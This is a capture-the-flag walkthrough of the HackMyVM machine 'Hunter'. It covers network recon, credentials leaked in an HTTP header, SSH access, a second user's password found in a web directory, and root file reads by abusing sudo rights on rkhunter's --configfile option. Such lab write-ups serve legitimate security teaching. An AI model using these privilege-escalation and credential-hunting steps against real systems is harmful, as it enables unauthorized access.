# Hunter

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| **Hunter** | **sml** | **Beginner** | **HackMyVM** |

**Summary:** Hunter is a beginner-level Boot2Root machine that emphasizes web enumeration, lateral movement, and the exploitation of binary configuration checks. The attack begins with identifying a Golang-based web server on port 8080, where a POST request to a hidden endpoint reveals credentials via an HTTP Response Header Leak. After gaining initial SSH access, Lateral Movement is performed by discovering credentials for a secondary user stored in a local directory. Final Privilege Escalation is achieved by abusing the `rkhunter` binary, specifically using its Configuration Check feature to perform an Arbitrary File Read on the root flag.

---

## Recon

First thing to do is looking for the target's IP:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l -I eth1
[sudo] password for kali:
Interface: eth1, type: EN10MB, MAC: 08:00:27:dc:38:4b, IPv4: 192.168.100.5
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   0a:00:27:00:00:03       (Unknown: locally administered)
192.168.100.2   08:00:27:35:04:1e       (Unknown)
192.168.100.6   08:00:27:33:83:6e       (Unknown)

13 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.022 seconds (126.61 hosts/sec). 3 responded

```
Target IP: `192.168.100.6`

Do enumeration to know the open ports:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- 192.168.100.6
-----[SNIP]-----
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Golang net/http server
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/admin
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Sun, 28 Dec 2025 14:36:41 GMT
|     Content-Length: 21
|     Content-Type: text/plain; charset=utf-8
|     Yes, thats a CTF :_(
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint 
```

Ports 22 and 8080 were opened and looks like there is `\robots.txt` and `\admin` directory.

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u 192.168.100.6:8080 -w /usr/share/wordlists/dirb/big.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 20469

Output File: /home/kali/reports/_192.168.100.6_8080/_25-12-28_21-45-12.txt

Target: http://192.168.100.6:8080/

[21:45:12] Starting:
[21:45:25] 200 -   13B  - /admin
[21:45:37] 204 -    0B  - /beacon
[21:47:24] 200 -   31B  - /robots.txt

Task Completed
```

directories confirmed. 

## Init Access

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v -X GET 192.168.100.6:8080/
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 192.168.100.6:8080...
* Connected to 192.168.100.6 (192.168.100.6) port 8080
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.100.6:8080
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 28 Dec 2025 14:49:28 GMT
< Content-Length: 21
< Content-Type: text/plain; charset=utf-8
<
Yes, thats a CTF :_(
* Connection #0 to host 192.168.100.6 left intact

┌──(kali㉿kali)-[~]
└─$ curl -v -X GET 192.168.100.6:8080/robots.txt
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 192.168.100.6:8080...
* Connected to 192.168.100.6 (192.168.100.6) port 8080
* using HTTP/1.x
> GET /robots.txt HTTP/1.1
> Host: 192.168.100.6:8080
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Date: Sun, 28 Dec 2025 14:49:33 GMT
< Content-Length: 31
<
User-agent: *
Disallow: /admin
* Connection #0 to host 192.168.100.6 left intact

┌──(kali㉿kali)-[~]
└─$ curl -v -X GET 192.168.100.6:8080/admin
*   Trying 192.168.100.6:8080...
* Connected to 192.168.100.6 (192.168.100.6) port 8080
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: 192.168.100.6:8080
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 28 Dec 2025 14:50:10 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
<
Invalid JWT.
* Connection #0 to host 192.168.100.6 left intact
```
Only `/admin` was interesting, it said **Invalid JWT**.

When looking for session token i got nothing. 

So, i trying another method and got secret credentials.

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST 192.168.100.6:8080/admin
*   Trying 192.168.100.6:8080...
* Connected to 192.168.100.6 (192.168.100.6) port 8080
* using HTTP/1.x
> POST /admin HTTP/1.1
> Host: 192.168.100.6:8080
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< X-Secret-Creds: hunterman:thisisnitriilcisi
< Date: Sun, 28 Dec 2025 14:50:19 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
<
Invalid JWT.
* Connection #0 to host 192.168.100.6 left intact
```

It was user `hunterman` with password `thisisnitriilcisi`.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh hunterman@192.168.100.6
-----[SNIP]-----
hunterman@192.168.100.6's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hunter:~$ id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
```
And there is a flag on this user

```
hunter:~$ ls -la
total 12
drwxr-sr-x    2 hunterman hunterman      4096 Nov 16 14:22 .
drwxr-xr-x    4 root     root          4096 Nov 16 14:12 ..
lrwxrwxrwx    1 hunterman hunterman         9 Nov 16 14:22 .ash_history -> /dev/null
-rw-------    1 hunterman hunterman        26 Nov 16 14:14 user.txt
hunter:~$ cat user.txt
HMV{[REDACTED]}
```

## PrivEsc

Identifying the route to escalating the privileges. 

```bash
hunter:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for hunterman:
Sorry, user hunterman may not run sudo on hunter.
```

hunter isn't in sudoers :'(

Opened the `/etc/passwd` given something 

```bash
hunter:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
-----[SNIP]-----
hunterman:x:1000:1000::/home/hunterman:/bin/sh
huntergirl:x:1001:1001::/home/huntergirl:/bin/sh
```

Turned out there is another user.

After jumping one to another directory, found credential for user `huntergirl`.
```bash
hunter:/var/www/html$ cat robots.txt
h u n t e r g i r l:fickshitmichini
```

login as that user and fortunately `huntergirl` got present.
```bash
hunter:/var/www/html$ ssh huntergirl@localhost
-----[SNIP]-----
huntergirl@localhost's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hunter:~$ id
uid=1001(huntergirl) gid=1001(huntergirl) groups=1001(huntergirl)
hunter:~$ ls -la
total 8
drwxr-sr-x    2 huntergirl huntergirl      4096 Nov 16 14:22 .
drwxr-xr-x    4 root     root          4096 Nov 16 14:12 ..
lrwxrwxrwx    1 huntergirl huntergirl         9 Nov 16 14:22 .ash_history -> /dev/null
hunter:~$ sudo -l
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
```

`huntergirl` can run binary `rkhunter` as root.

Let's understanding this binary:
```bash
hunter:~$ sudo rkhunter -h

Usage: rkhunter {--check | --unlock | --update | --versioncheck |
                 --propupd [{filename | directory | package name},...] |
                 --list [{tests | {lang | languages} | rootkits | perl | propfiles}] |
                 --config-check | --version | --help} [options]

Current options are:
         --append-log                  Append to the logfile, do not overwrite
         --bindir <directory>...       Use the specified command directories
     -c, --check                       Check the local system
     -C, --config-check                Check the configuration file(s), then exit
  --cs2, --color-set2                  Use the second color set for output
         --configfile <file>           Use the specified configuration file
-----[SNIP]----
```

So basically, this binary can read the configuration of file's based on the file we are pointing out.

Knowing this, I could tell rkhunter to read `/root/root.txt` as configuration file.
Using option `-C` to check configuration of some file and specified the file I'm going to read using `--configfile`.

```bash
hunter:~$ sudo rkhunter -C --configfile /root/root.txt
-----[SNIP]-----
grep: bad regex ' HMV{[REDACTED]} ': Invalid contents of {}
Unknown configuration file option: HMV{[REDACTED]}
```